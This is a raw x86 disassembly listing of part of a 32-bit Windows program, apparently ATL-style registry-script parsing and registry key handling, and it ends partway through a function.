  404164:	sar    edx,1
  404166:	lea    ecx,[edx+0x1]
  404169:	lea    ecx,[esi+ecx*2]
  40416c:	cmp    ecx,DWORD PTR [ebp-0x4]
  40416f:	jae    0x404213
  404175:	test   edx,edx
  404177:	jle    0x40418a
  404179:	sub    ebx,esi
  40417b:	mov    ax,WORD PTR [ebx+esi*1]
  40417f:	mov    WORD PTR [esi],ax
  404182:	add    esi,0x2
  404185:	sub    edx,0x1
  404188:	jne    0x40417b
  40418a:	mov    eax,DWORD PTR [edi]
  40418c:	xor    ecx,ecx
  40418e:	cmp    cx,WORD PTR [eax]
  404191:	jne    0x40412f
  404193:	mov    ebx,DWORD PTR [ebp-0x4]
  404196:	mov    eax,DWORD PTR [edi]
  404198:	xor    ecx,ecx
  40419a:	cmp    cx,WORD PTR [eax]
  40419d:	je     0x404213
  40419f:	cmp    esi,ebx
  4041a1:	jae    0x404213
  4041a3:	xor    eax,eax
  4041a5:	mov    WORD PTR [esi],ax
  4041a8:	push   DWORD PTR [edi]
  4041aa:	call   DWORD PTR ds:0x4080d8
  4041b0:	mov    DWORD PTR [edi],eax
  4041b2:	jmp    0x40420f
  4041b4:	mov    ebx,DWORD PTR [edi]
  4041b6:	movzx  eax,WORD PTR [ebx]
  4041b9:	cmp    eax,0x9
  4041bc:	jl     0x4041cd
  4041be:	cmp    eax,0xa
  4041c1:	jle    0x404205
  4041c3:	cmp    eax,0xd
  4041c6:	je     0x404205
  4041c8:	cmp    eax,0x20
  4041cb:	je     0x404205
  4041cd:	push   ebx
  4041ce:	call   DWORD PTR ds:0x4080d8
  4041d4:	mov    edx,eax
  4041d6:	mov    DWORD PTR [edi],edx
  4041d8:	sub    edx,ebx
  4041da:	sar    edx,1
  4041dc:	lea    ecx,[edx+0x1]
  4041df:	lea    ecx,[esi+ecx*2]
  4041e2:	cmp    ecx,DWORD PTR [ebp-0x4]
  4041e5:	jae    0x404213
  4041e7:	test   edx,edx
  4041e9:	jle    0x4041fc
  4041eb:	sub    ebx,esi
  4041ed:	mov    ax,WORD PTR [ebx+esi*1]
  4041f1:	mov    WORD PTR [esi],ax
  4041f4:	add    esi,0x2
  4041f7:	sub    edx,0x1
  4041fa:	jne    0x4041ed
  4041fc:	mov    eax,DWORD PTR [edi]
  4041fe:	xor    ecx,ecx
  404200:	cmp    cx,WORD PTR [eax]
  404203:	jne    0x4041b4
  404205:	cmp    esi,DWORD PTR [ebp-0x4]
  404208:	jae    0x404213
  40420a:	xor    eax,eax
  40420c:	mov    WORD PTR [esi],ax
  40420f:	xor    eax,eax
  404211:	jmp    0x404218
  404213:	mov    eax,0x80020009
  404218:	pop    esi
  404219:	pop    ebx
  40421a:	pop    edi
  40421b:	mov    esp,ebp
  40421d:	pop    ebp
  40421e:	ret    0x4
  404221:	int3   
  404222:	int3   
  404223:	int3   
  404224:	int3   
  404225:	int3   
  404226:	mov    edi,edi
  404228:	push   ebp
  404229:	mov    ebp,esp
  40422b:	and    esp,0xfffffff8
  40422e:	mov    eax,0x2264
  404233:	call   0x406bf0
  404238:	mov    eax,ds:0x407008
  40423d:	xor    eax,esp
  40423f:	mov    DWORD PTR [esp+0x2260],eax
  404246:	mov    eax,ecx
  404248:	mov    ecx,DWORD PTR [ebp+0xc]
  40424b:	push   ebx
  40424c:	mov    DWORD PTR [esp+0x14],ecx
  404250:	xor    ecx,ecx
  404252:	push   esi
  404253:	mov    ebx,ecx
  404255:	mov    DWORD PTR [esp+0x2c],ecx
  404259:	mov    DWORD PTR [esp+0x24],ecx
  40425d:	mov    DWORD PTR [esp+0x28],ecx
  404261:	mov    ecx,DWORD PTR [ebp+0x14]
  404264:	push   edi
  404265:	mov    edi,DWORD PTR [ebp+0x8]
  404268:	mov    DWORD PTR [esp+0x34],ecx
  40426c:	mov    ecx,eax
  40426e:	push   edi
  40426f:	mov    DWORD PTR [esp+0x18],eax
  404273:	mov    DWORD PTR [esp+0x28],ebx
  404277:	call   0x4040e1
  40427c:	mov    esi,eax
  40427e:	test   esi,esi
  404280:	js     0x4047bf
  404286:	jmp    0x40477c
  40428b:	push   0x4011b8
  404290:	push   edi
  404291:	mov    DWORD PTR [esp+0x18],0x1
  404299:	call   DWORD PTR ds:0x408034
  40429f:	neg    eax
  4042a1:	push   0x40118c
  4042a6:	sbb    esi,esi
  4042a8:	inc    esi
  4042a9:	push   edi
  4042aa:	mov    DWORD PTR [esp+0x20],esi
  4042ae:	call   DWORD PTR ds:0x408034
  4042b4:	test   eax,eax
  4042b6:	je     0x4042c0
  4042b8:	test   esi,esi
  4042ba:	je     0x404342
  4042c0:	mov    ecx,DWORD PTR [esp+0x14]
  4042c4:	push   edi
  4042c5:	call   0x4040e1
  4042ca:	mov    esi,eax
  4042cc:	test   esi,esi
  4042ce:	js     0x4047b4
  4042d4:	xor    esi,esi
  4042d6:	cmp    DWORD PTR [ebp+0x10],esi
  4042d9:	je     0x404344
  4042db:	push   0x5c
  4042dd:	pop    edx
  4042de:	mov    ecx,edi
  4042e0:	mov    DWORD PTR [esp+0x38],esi
  4042e4:	mov    DWORD PTR [esp+0x3c],esi
  4042e8:	mov    DWORD PTR [esp+0x40],esi
  4042ec:	call   0x40382e
  4042f1:	test   eax,eax
  4042f3:	jne    0x4047af
  4042f9:	push   edi
  4042fa:	call   0x403e6b
  4042ff:	test   eax,eax
  404301:	je     0x404319
  404303:	mov    eax,DWORD PTR [esp+0x1c]
  404307:	lea    ecx,[esp+0x38]
  40430b:	push   edi
  40430c:	mov    DWORD PTR [esp+0x3c],eax
  404310:	call   0x403ea1
  404315:	mov    DWORD PTR [esp+0x38],esi
  404319:	cmp    DWORD PTR [esp+0x18],esi
  40431d:	je     0x404344
  40431f:	mov    ecx,DWORD PTR [esp+0x14]
  404323:	push   edi
  404324:	call   0x4040e1
  404329:	mov    esi,eax
  40432b:	test   esi,esi
  40432d:	js     0x4047b4
  404333:	mov    ecx,DWORD PTR [esp+0x14]
  404337:	push   edi
  404338:	call   0x403dfd
  40433d:	jmp    0x40456d
  404342:	xor    esi,esi
  404344:	push   0x4011a4
  404349:	push   edi
  40434a:	call   DWORD PTR ds:0x408034
  404350:	test   eax,eax
  404352:	jne    0x40436c
  404354:	mov    ecx,DWORD PTR [esp+0x14]
  404358:	push   edi
  404359:	mov    DWORD PTR [esp+0x14],esi
  40435d:	call   0x4040e1
  404362:	mov    esi,eax
  404364:	test   esi,esi
  404366:	js     0x4047b4
  40436c:	push   0x401184
  404371:	push   edi
  404372:	call   DWORD PTR ds:0x408034
  404378:	test   eax,eax
  40437a:	jne    0x404470
  404380:	mov    ecx,DWORD PTR [esp+0x14]
  404384:	lea    eax,[esp+0x268]
  40438b:	push   eax
  40438c:	call   0x4040e1
  404391:	mov    esi,eax
  404393:	test   esi,esi
  404395:	js     0x4047b4
  40439b:	mov    ecx,DWORD PTR [esp+0x14]
  40439f:	push   edi
  4043a0:	call   0x4040e1
  4043a5:	mov    esi,eax
  4043a7:	test   esi,esi
  4043a9:	js     0x4047b4
  4043af:	push   0x3d
  4043b1:	pop    eax
  4043b2:	cmp    WORD PTR [edi],ax
  4043b5:	jne    0x4047af
  4043bb:	cmp    DWORD PTR [ebp+0x10],0x0
  4043bf:	je     0x4043f7
  4043c1:	mov    ecx,DWORD PTR [esp+0x14]
  4043c5:	xor    eax,eax
  4043c7:	mov    DWORD PTR [esp+0x48],eax
  4043cb:	mov    DWORD PTR [esp+0x4c],eax
  4043cf:	mov    eax,DWORD PTR [esp+0x1c]
  4043d3:	mov    DWORD PTR [esp+0x44],eax
  4043d7:	lea    eax,[esp+0x268]
  4043de:	push   edi
  4043df:	push   eax
  4043e0:	lea    eax,[esp+0x4c]
  4043e4:	push   eax
  4043e5:	call   0x403989
  4043ea:	mov    esi,eax
  4043ec:	xor    eax,eax
  4043ee:	mov    DWORD PTR [esp+0x44],eax
  4043f2:	jmp    0x40456f
  4043f7:	cmp    DWORD PTR [ebp+0x14],0x0
  4043fb:	jne    0x404457
  4043fd:	cmp    DWORD PTR [esp+0x10],0x0
  404402:	je     0x404457
  404404:	lea    eax,[esp+0x10]
  404408:	xor    ecx,ecx
  40440a:	push   eax
  40440b:	push   0x20006
  404410:	push   ecx
  404411:	push   ecx
  404412:	push   DWORD PTR [esp+0x2c]
  404416:	mov    DWORD PTR [esp+0x24],ecx
  40441a:	call   DWORD PTR ds:0x40800c
  404420:	test   eax,eax
  404422:	jne    0x4047a4
  404428:	mov    esi,DWORD PTR [esp+0x10]
  40442c:	lea    eax,[esp+0x268]
  404433:	push   eax
  404434:	push   esi
  404435:	mov    DWORD PTR [esp+0x20],esi
  404439:	call   DWORD PTR ds:0x408018
  40443f:	test   eax,eax
  404441:	je     0x40444c
  404443:	cmp    eax,0x2
  404446:	jne    0x40478a
  40444c:	test   esi,esi
  40444e:	je     0x404457
  404450:	push   esi
  404451:	call   DWORD PTR ds:0x408000
  404457:	mov    ecx,DWORD PTR [esp+0x14]
  40445b:	push   edi
  40445c:	call   0x403dfd
  404461:	mov    esi,eax
  404463:	test   esi,esi
  404465:	js     0x4047b4
  40446b:	jmp    0x40477c
  404470:	push   0x5c
  404472:	pop    edx
  404473:	mov    ecx,edi
  404475:	call   0x40382e
  40447a:	test   eax,eax
  40447c:	jne    0x4047af
  404482:	cmp    DWORD PTR [ebp+0x10],eax
  404485:	je     0x4045cc
  40448b:	mov    esi,DWORD PTR [esp+0x1c]
  40448f:	lea    eax,[esp+0x10]
  404493:	push   eax
  404494:	push   0x2001f
  404499:	xor    ecx,ecx
  40449b:	push   ecx
  40449c:	push   edi
  40449d:	push   esi
  40449e:	mov    DWORD PTR [esp+0x24],ecx
  4044a2:	call   DWORD PTR ds:0x40800c
  4044a8:	test   eax,eax
  4044aa:	jne    0x4044c3
  4044ac:	test   ebx,ebx
  4044ae:	je     0x4044b7
  4044b0:	push   ebx
  4044b1:	call   DWORD PTR ds:0x408000
  4044b7:	mov    ebx,DWORD PTR [esp+0x10]
  4044bb:	mov    DWORD PTR [esp+0x24],ebx
  4044bf:	test   eax,eax
  4044c1:	je     0x40453b
  4044c3:	lea    eax,[esp+0x10]
  4044c7:	xor    ecx,ecx
  4044c9:	push   eax
  4044ca:	push   0x20019
  4044cf:	push   ecx
  4044d0:	push   edi
  4044d1:	push   esi
  4044d2:	mov    DWORD PTR [esp+0x24],ecx
  4044d6:	call   DWORD PTR ds:0x40800c
  4044dc:	test   eax,eax
  4044de:	jne    0x4044f7
  4044e0:	test   ebx,ebx
  4044e2:	je     0x4044eb
  4044e4:	push   ebx
  4044e5:	call   DWORD PTR ds:0x408000
  4044eb:	mov    ebx,DWORD PTR [esp+0x10]
  4044ef:	mov    DWORD PTR [esp+0x24],ebx
  4044f3:	test   eax,eax
  4044f5:	je     0x40453b
  4044f7:	lea    eax,[esp+0x5c]
  4044fb:	xor    ecx,ecx
  4044fd:	push   eax
  4044fe:	lea    eax,[esp+0x14]
  404502:	mov    DWORD PTR [esp+0x14],ecx
  404506:	push   eax
  404507:	push   ecx
  404508:	push   0x2001f
  40450d:	push   ecx
  40450e:	push   ecx
  40450f:	push   ecx
  404510:	push   edi
  404511:	push   esi
  404512:	call   DWORD PTR ds:0x408014
  404518:	test   eax,eax
  40451a:	jne    0x4047a4
  404520:	test   ebx,ebx
  404522:	je     0x40452b
  404524:	push   ebx
  404525:	call   DWORD PTR ds:0x408000
  40452b:	mov    ebx,DWORD PTR [esp+0x10]
  40452f:	mov    DWORD PTR [esp+0x24],ebx
  404533:	test   eax,eax
  404535:	jne    0x4047a4
  40453b:	mov    ecx,DWORD PTR [esp+0x14]
  40453f:	push   edi
  404540:	call   0x4040e1
  404545:	mov    esi,eax
  404547:	test   esi,esi
  404549:	js     0x4047b4
  40454f:	push   0x3d
  404551:	pop    eax
  404552:	cmp    WORD PTR [edi],ax
  404555:	jne    0x404577
  404557:	mov    ecx,DWORD PTR [esp+0x14]
  40455b:	xor    eax,eax
  40455d:	push   edi
  40455e:	push   eax
  40455f:	lea    eax,[esp+0x2c]
  404563:	push   eax
  404564:	call   0x403989
  404569:	mov    ebx,DWORD PTR [esp+0x24]
  40456d:	mov    esi,eax
  40456f:	test   esi,esi
  404571:	js     0x4047b4
  404577:	push   0x7b
  404579:	pop    eax
  40457a:	cmp    WORD PTR [edi],ax
  40457d:	jne    0x40477c
  404583:	mov    ecx,edi
  404585:	lea    edx,[ecx+0x2]
  404588:	mov    ax,WORD PTR [ecx]
  40458b:	add    ecx,0x2
  40458e:	cmp    ax,WORD PTR [esp+0x30]
  404593:	jne    0x404588
  404595:	sub    ecx,edx
  404597:	sar    ecx,1
  404599:	cmp    ecx,0x1
  40459c:	jne    0x40477c
  4045a2:	mov    ecx,DWORD PTR [esp+0x14]
  4045a6:	xor    eax,eax
  4045a8:	push   eax
  4045a9:	push   DWORD PTR [ebp+0x10]
  4045ac:	push   ebx
  4045ad:	push   edi
  4045ae:	call   0x404226
  4045b3:	mov    esi,eax
  4045b5:	test   esi,esi
  4045b7:	js     0x4047b4
  4045bd:	mov    ecx,DWORD PTR [esp+0x14]
  4045c1:	push   edi
  4045c2:	call   0x4040e1
  4045c7:	jmp    0x404461
  4045cc:	cmp    DWORD PTR [ebp+0x14],0x0
  4045d0:	jne    0x404615
  4045d2:	lea    eax,[esp+0x18]
  4045d6:	xor    esi,esi
  4045d8:	push   eax
  4045d9:	push   0x20019
  4045de:	push   esi
  4045df:	push   edi
  4045e0:	push   DWORD PTR [esp+0x2c]
  4045e4:	mov    DWORD PTR [esp+0x2c],esi
  4045e8:	call   DWORD PTR ds:0x40800c
  4045ee:	mov    DWORD PTR [esp+0x20],eax
  4045f2:	test   eax,eax
  4045f4:	jne    0x404620
  4045f6:	mov    DWORD PTR [esp+0x20],esi
  4045fa:	mov    eax,esi
  4045fc:	test   ebx,ebx
  4045fe:	je     0x40460b
  404600:	push   ebx
  404601:	call   DWORD PTR ds:0x408000
  404607:	mov    DWORD PTR [esp+0x20],eax
  40460b:	mov    ebx,DWORD PTR [esp+0x18]
  40460f:	mov    DWORD PTR [esp+0x24],ebx
  404613:	jmp    0x40461c
  404615:	push   0x2
  404617:	pop    eax
  404618:	mov    DWORD PTR [esp+0x20],eax
  40461c:	test   eax,eax
  40461e:	je     0x404627
  404620:	mov    DWORD PTR [ebp+0x14],0x1
  404627:	push   0xffffffff
  404629:	push   edi
  40462a:	lea    eax,[esp+0x68]
  40462e:	push   0x104
  404633:	push   eax
  404634:	call   DWORD PTR ds:0x408154
  40463a:	add    esp,0x10
  40463d:	mov    ecx,eax
  40463f:	call   0x403dc5
  404644:	mov    ecx,DWORD PTR [esp+0x14]
  404648:	push   edi
  404649:	call   0x4040e1
  40464e:	mov    esi,eax
  404650:	test   esi,esi
  404652:	js     0x4047b4
  404658:	mov    ecx,DWORD PTR [esp+0x14]
  40465c:	push   edi
  40465d:	call   0x403dfd
  404662:	mov    esi,eax
  404664:	test   esi,esi
  404666:	js     0x4047b4
  40466c:	push   0x7b
  40466e:	pop    eax
  40466f:	cmp    WORD PTR [edi],ax
  404672:	jne    0x4046c4
  404674:	mov    ecx,edi
  404676:	lea    edx,[ecx+0x2]
  404679:	mov    ax,WORD PTR [ecx]
  40467c:	add    ecx,0x2
  40467f:	cmp    ax,WORD PTR [esp+0x30]
  404684:	jne    0x404679
  404686:	sub    ecx,edx
  404688:	sar    ecx,1
  40468a:	cmp    ecx,0x1
  40468d:	jne    0x4046c4
  40468f:	push   DWORD PTR [ebp+0x14]
  404692:	mov    ecx,DWORD PTR [esp+0x18]
  404696:	xor    eax,eax
  404698:	push   eax
  404699:	push   ebx
  40469a:	push   edi
  40469b:	call   0x404226
  4046a0:	mov    esi,eax
  4046a2:	test   esi,esi
  4046a4:	jns    0x4046b0
  4046a6:	cmp    DWORD PTR [ebp+0x14],0x0
  4046aa:	je     0x4047b4
  4046b0:	mov    ecx,DWORD PTR [esp+0x14]
  4046b4:	push   edi
  4046b5:	call   0x4040e1
  4046ba:	mov    esi,eax
  4046bc:	test   esi,esi
  4046be:	js     0x4047b4
  4046c4:	mov    ecx,DWORD PTR [esp+0x20]
  4046c8:	mov    eax,DWORD PTR [esp+0x34]
  4046cc:	mov    DWORD PTR [ebp+0x14],eax
  4046cf:	cmp    ecx,0x2
  4046d2:	je     0x40477c
  4046d8:	test   ecx,ecx
  4046da:	je     0x4046e9
  4046dc:	test   eax,eax
  4046de:	je     0x4047a6
  4046e4:	jmp    0x40477c
  4046e9:	test   eax,eax
  4046eb:	je     0x404720
  4046ed:	push   ebx
  4046ee:	call   0x403fdd
  4046f3:	test   eax,eax
  4046f5:	je     0x404720
  4046f7:	lea    eax,[esp+0x60]
  4046fb:	push   eax
  4046fc:	call   0x403e6b
  404701:	test   eax,eax
  404703:	je     0x40477c
  404705:	cmp    DWORD PTR [esp+0x10],0x0
  40470a:	je     0x40477c
  40470c:	lea    eax,[esp+0x60]
  404710:	push   eax
  404711:	lea    ecx,[esp+0x28]
  404715:	call   0x403ea1
  40471a:	mov    ebx,DWORD PTR [esp+0x24]
  40471e:	jmp    0x40477c
  404720:	push   ebx
  404721:	call   0x403fdd
  404726:	mov    DWORD PTR [esp+0x18],eax
  40472a:	test   ebx,ebx
  40472c:	je     0x404747
  40472e:	push   ebx
  40472f:	call   DWORD PTR ds:0x408000
  404735:	xor    ecx,ecx
  404737:	mov    ebx,ecx
  404739:	mov    DWORD PTR [esp+0x24],ebx
  40473d:	test   eax,eax
  40473f:	jne    0x4047a4
  404741:	mov    eax,DWORD PTR [esp+0x18]
  404745:	jmp    0x404749
  404747:	xor    ecx,ecx
  404749:	cmp    DWORD PTR [esp+0x10],0x0
  40474e:	je     0x40477c
  404750:	test   eax,eax
  404752:	jne    0x40477c
  404754:	mov    eax,DWORD PTR [esp+0x1c]
  404758:	mov    DWORD PTR [esp+0x50],eax
  40475c:	lea    eax,[esp+0x60]
  404760:	mov    DWORD PTR [esp+0x54],ecx
  404764:	mov    DWORD PTR [esp+0x58],ecx
  404768:	lea    ecx,[esp+0x50]
  40476c:	push   eax
  40476d:	call   0x40401b
  404772:	xor    ecx,ecx
  404774:	mov    DWORD PTR [esp+0x50],ecx
  404778:	test   eax,eax
  40477a:	jne    0x4047a4
  40477c:	push   0x7d
  40477e:	pop    eax
  40477f:	cmp    WORD PTR [edi],ax
  404782:	jne    0x40428b
  404788:	jmp    0x4047b4
  40478a:	mov    ecx,eax
  40478c:	call   0x4040cc
  404791:	mov    esi,eax
  404793:	mov    eax,DWORD PTR [esp+0x18]
  404797:	test   eax,eax
  404799:	je     0x4047b4
  40479b:	push   eax
  40479c:	call   DWORD PTR ds:0x408000
  4047a2:	jmp    0x4047b4
  4047a4:	mov    ecx,eax
  4047a6:	call   0x4040cc
  4047ab:	mov    esi,eax
  4047ad:	jmp    0x4047b4
  4047af:	mov    esi,0x80020009
  4047b4:	test   ebx,ebx
  4047b6:	je     0x4047bf
  4047b8:	push   ebx
  4047b9:	call   DWORD PTR ds:0x408000
  4047bf:	mov    ecx,DWORD PTR [esp+0x226c]
  4047c6:	mov    eax,esi
  4047c8:	pop    edi
  4047c9:	pop    esi
  4047ca:	pop    ebx
  4047cb:	xor    ecx,esp
  4047cd:	call   0x406340
  4047d2:	mov    esp,ebp
  4047d4:	pop    ebp
  4047d5:	ret    0x10
  4047d8:	int3   
  4047d9:	int3   
  4047da:	int3   
  4047db:	int3   
  4047dc:	int3   
  4047dd:	mov    edi,edi
  4047df:	push   esi
  4047e0:	mov    esi,ecx
  4047e2:	mov    ecx,DWORD PTR [esi]
  4047e4:	movzx  eax,WORD PTR [ecx]
  4047e7:	cmp    eax,0x9
  4047ea:	jl     0x404806
  4047ec:	cmp    eax,0xa
  4047ef:	jle    0x4047fb
  4047f1:	cmp    eax,0xd
  4047f4:	je     0x4047fb
  4047f6:	cmp    eax,0x20
  4047f9:	jne    0x404806
  4047fb:	push   ecx
  4047fc:	call   DWORD PTR ds:0x4080d8
  404802:	mov    DWORD PTR [esi],eax
  404804:	jmp    0x4047e2
  404806:	pop    esi
  404807:	ret    
  404808:	int3   
  404809:	int3   
  40480a:	int3   
  40480b:	int3   
  40480c:	int3   
  40480d:	mov    edi,edi
  40480f:	push   ebp
  404810:	mov    ebp,esp
  404812:	mov    eax,0x200c
  404817:	call   0x406bf0
  40481c:	mov    eax,ds:0x407008
  404821:	xor    eax,ebp
  404823:	mov    DWORD PTR [ebp-0x4],eax
  404826:	mov    eax,DWORD PTR [ebp+0x8]
  404829:	and    DWORD PTR [ebp-0x2008],0x0
  404830:	push   esi
  404831:	push   edi
  404832:	mov    edi,ecx
  404834:	lea    ecx,[ebp-0x2008]
  40483a:	push   ecx
  40483b:	push   eax
  40483c:	mov    ecx,edi
  40483e:	call   0x403676
  404843:	mov    esi,eax
  404845:	test   esi,esi
  404847:	js     0x404954
  40484d:	mov    eax,DWORD PTR [ebp-0x2008]
  404853:	xor    ecx,ecx
  404855:	mov    DWORD PTR [edi],eax
  404857:	cmp    cx,WORD PTR [eax]
  40485a:	je     0x404946
  404860:	push   ebx
  404861:	lea    eax,[ebp-0x2004]
  404867:	mov    ecx,edi
  404869:	push   eax
  40486a:	call   0x4040e1
  40486f:	mov    esi,eax
  404871:	test   esi,esi
  404873:	js     0x404945
  404879:	xor    esi,esi
  40487b:	push   DWORD PTR [esi*8+0x401658]
  404882:	lea    eax,[ebp-0x2004]
  404888:	push   eax
  404889:	call   DWORD PTR ds:0x408034
  40488f:	test   eax,eax
  404891:	je     0x40489d
  404893:	inc    esi
  404894:	cmp    esi,0xe
  404897:	jb     0x40487b
  404899:	xor    ebx,ebx
  40489b:	jmp    0x4048a4
  40489d:	mov    ebx,DWORD PTR [esi*8+0x40165c]
  4048a4:	test   ebx,ebx
  4048a6:	je     0x404940
  4048ac:	lea    eax,[ebp-0x2004]
  4048b2:	mov    ecx,edi
  4048b4:	push   eax
  4048b5:	call   0x4040e1
  4048ba:	mov    esi,eax
  4048bc:	test   esi,esi
  4048be:	js     0x404945
  4048c4:	push   0x7b
  4048c6:	pop    eax
  4048c7:	cmp    ax,WORD PTR [ebp-0x2004]
  4048ce:	jne    0x404940
  4048d0:	cmp    DWORD PTR [ebp+0xc],0x0
  4048d4:	mov    ecx,edi
  4048d6:	push   0x0
  4048d8:	je     0x404915
  4048da:	push   DWORD PTR [ebp+0xc]
  4048dd:	mov    eax,DWORD PTR [edi]
  4048df:	mov    DWORD PTR [ebp-0x200c],eax
  4048e5:	lea    eax,[ebp-0x2004]
  4048eb:	push   ebx
  4048ec:	push   eax
  4048ed:	call   0x404226
  4048f2:	mov    esi,eax
  4048f4:	test   esi,esi
  4048f6:	jns    0x40492a
  4048f8:	mov    eax,DWORD PTR [ebp-0x200c]
  4048fe:	mov    ecx,edi
  404900:	push   0x0
  404902:	push   0x0
  404904:	mov    DWORD PTR [edi],eax
  404906:	lea    eax,[ebp-0x2004]
  40490c:	push   ebx
  40490d:	push   eax
  40490e:	call   0x404226
  404913:	jmp    0x404945
  404915:	push   0x0
  404917:	push   ebx
  404918:	lea    eax,[ebp-0x2004]
  40491e:	push   eax
  40491f:	call   0x404226
  404924:	mov    esi,eax
  404926:	test   esi,esi
  404928:	js     0x404945
  40492a:	mov    ecx,edi
  40492c:	call   0x4047dd
  404931:	mov    eax,DWORD PTR [edi]
  404933:	xor    ecx,ecx
  404935:	cmp    cx,WORD PTR [eax]
  404938:	jne    0x404861
  40493e:	jmp    0x404945
  404940:	mov    esi,0x80020009
  404945:	pop    ebx
  404946:	push   DWORD PTR [ebp-0x2008]
  40494c:	call   DWORD PTR ds:0x408198
  404952:	mov    eax,esi
  404954:	mov    ecx,DWORD PTR [ebp-0x4]
  404957:	pop    edi
  404958:	xor    ecx,ebp
  40495a:	pop    esi
  40495b:	call   0x406340
  404960:	mov    esp,ebp
  404962:	pop    ebp
  404963:	ret    0x8
  404966:	int3   
  404967:	int3   
  404968:	int3   
  404969:	int3   
  40496a:	int3   
  40496b:	mov    edi,edi
  40496d:	push   ebp
  40496e:	mov    ebp,esp
  404970:	sub    esp,0x414
  404976:	mov    eax,ds:0x407008
  40497b:	xor    eax,ebp
  40497d:	mov    DWORD PTR [ebp-0x4],eax
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	xor    edx,edx
  404985:	push   ebx
  404986:	mov    ebx,DWORD PTR [ebp+0x10]
  404989:	push   esi
  40498a:	mov    esi,DWORD PTR [ebp+0xc]
  40498d:	push   edi
  40498e:	push   0x2
  404990:	mov    DWORD PTR [ebp-0x410],ecx
  404996:	pop    ecx
  404997:	push   ecx
  404998:	push   edx
  404999:	push   eax
  40499a:	mov    DWORD PTR [ebp-0x40c],edx
  4049a0:	mov    DWORD PTR [ebp-0x414],edx
  4049a6:	mov    DWORD PTR [ebp-0x408],edx
  4049ac:	call   DWORD PTR ds:0x40802c
  4049b2:	mov    edi,eax
  4049b4:	test   edi,edi
  4049b6:	jne    0x4049c4
  4049b8:	call   0x40354f
  4049bd:	mov    esi,eax
  4049bf:	jmp    0x404a91
  4049c4:	push   0x0
  4049c6:	push   esi
  4049c7:	push   ebx
  4049c8:	push   edi
  4049c9:	call   DWORD PTR ds:0x408048
  4049cf:	mov    esi,eax
  4049d1:	test   esi,esi
  4049d3:	jne    0x4049df
  4049d5:	call   0x40354f
  4049da:	jmp    0x404a88
  4049df:	push   esi
  4049e0:	push   edi
  4049e1:	call   DWORD PTR ds:0x408044
  4049e7:	mov    ebx,eax
  4049e9:	test   ebx,ebx
  4049eb:	je     0x4049d5
  4049ed:	push   esi
  4049ee:	push   edi
  4049ef:	call   DWORD PTR ds:0x408040
  4049f5:	mov    esi,eax
  4049f7:	lea    eax,[esi+0x1]
  4049fa:	cmp    eax,esi
  4049fc:	jae    0x404a08
  4049fe:	mov    esi,0x8007000e
  404a03:	jmp    0x404a91
  404a08:	push   0x2
  404a0a:	pop    ecx
  404a0b:	mul    ecx
  404a0d:	test   edx,edx
  404a0f:	jne    0x404aca
  404a15:	cmp    eax,0xffffffff
  404a18:	ja     0x404aca
  404a1e:	cmp    eax,0x400
  404a23:	jbe    0x404a39
  404a25:	push   eax
  404a26:	lea    ecx,[ebp-0x408]
  404a2c:	call   0x403522
  404a31:	mov    eax,DWORD PTR [ebp-0x408]
  404a37:	jmp    0x404a45
  404a39:	lea    eax,[ebp-0x404]
  404a3f:	mov    DWORD PTR [ebp-0x408],eax
  404a45:	test   eax,eax
  404a47:	jne    0x404a50
  404a49:	mov    esi,0x8007000e
  404a4e:	jmp    0x404a8a
  404a50:	push   esi
  404a51:	push   eax
  404a52:	push   esi
  404a53:	push   ebx
  404a54:	push   0x0
  404a56:	push   0x3
  404a58:	call   DWORD PTR ds:0x40803c
  404a5e:	mov    ecx,eax
  404a60:	test   ecx,ecx
  404a62:	je     0x4049d5
  404a68:	mov    eax,DWORD PTR [ebp-0x408]
  404a6e:	xor    edx,edx
  404a70:	push   DWORD PTR [ebp+0x14]
  404a73:	mov    WORD PTR [eax+ecx*2],dx
  404a77:	lea    ecx,[ebp-0x414]
  404a7d:	push   DWORD PTR [ebp-0x408]
  404a83:	call   0x40480d
  404a88:	mov    esi,eax
  404a8a:	push   edi
  404a8b:	call   DWORD PTR ds:0x408020
  404a91:	lea    eax,[ebp-0x404]
  404a97:	cmp    DWORD PTR [ebp-0x408],eax
  404a9d:	je     0x404aaa
  404a9f:	lea    ecx,[ebp-0x408]
  404aa5:	call   0x403513
  404aaa:	lea    ecx,[ebp-0x40c]
  404ab0:	call   0x403968
  404ab5:	mov    ecx,DWORD PTR [ebp-0x4]
  404ab8:	mov    eax,esi
  404aba:	pop    edi
  404abb:	pop    esi
  404abc:	xor    ecx,ebp
  404abe:	pop    ebx
  404abf:	call   0x406340
  404ac4:	mov    esp,ebp
  404ac6:	pop    ebp
  404ac7:	ret    0x10
  404aca:	mov    ecx,0x80070057
  404acf:	call   0x403da4
  404ad4:	int3   
  404ad5:	int3   
  404ad6:	int3   
  404ad7:	int3   
  404ad8:	int3   
  404ad9:	int3   
  404ada:	mov    edi,edi
  404adc:	push   ebp
  404add:	mov    ebp,esp
  404adf:	sub    esp,0xa50
  404ae5:	mov    eax,ds:0x407008
  404aea:	xor    eax,ebp
  404aec:	mov    DWORD PTR [ebp-0x4],eax
  404aef:	push   ebx
  404af0:	xor    eax,eax
  404af2:	mov    DWORD PTR [ebp-0xa50],0x401358
  404afc:	push   esi
  404afd:	mov    esi,DWORD PTR [ebp+0xc]
  404b00:	mov    ebx,edx
  404b02:	mov    DWORD PTR [ebp-0xa4c],eax
  404b08:	mov    DWORD PTR [ebp-0xa48],eax
  404b0e:	mov    DWORD PTR [ebp-0xa44],eax
  404b14:	push   edi
  404b15:	mov    edi,DWORD PTR ds:0x407414
  404b1b:	test   esi,esi
  404b1d:	je     0x404b3a
  404b1f:	jmp    0x404b34
  404b21:	push   DWORD PTR [esi+0x4]
  404b24:	push   eax
  404b25:	lea    eax,[ebp-0xa50]
  404b2b:	push   eax
  404b2c:	call   0x4034c0
  404b31:	lea    esi,[esi+0x8]
  404b34:	mov    eax,DWORD PTR [esi]
  404b36:	test   eax,eax
  404b38:	jne    0x404b21
  404b3a:	mov    eax,DWORD PTR [edi]
  404b3c:	lea    ecx,[ebp-0xa50]
  404b42:	push   ecx
  404b43:	mov    esi,DWORD PTR [eax+0x14]
  404b46:	mov    ecx,esi
  404b48:	call   DWORD PTR ds:0x4081a0
  404b4e:	mov    ecx,edi
  404b50:	call   esi
  404b52:	mov    esi,eax
  404b54:	test   esi,esi
  404b56:	js     0x404ccf
  404b5c:	mov    esi,DWORD PTR ds:0x40748c
  404b62:	lea    eax,[ebp-0x20c]
  404b68:	push   0x104
  404b6d:	push   eax
  404b6e:	xor    edi,edi
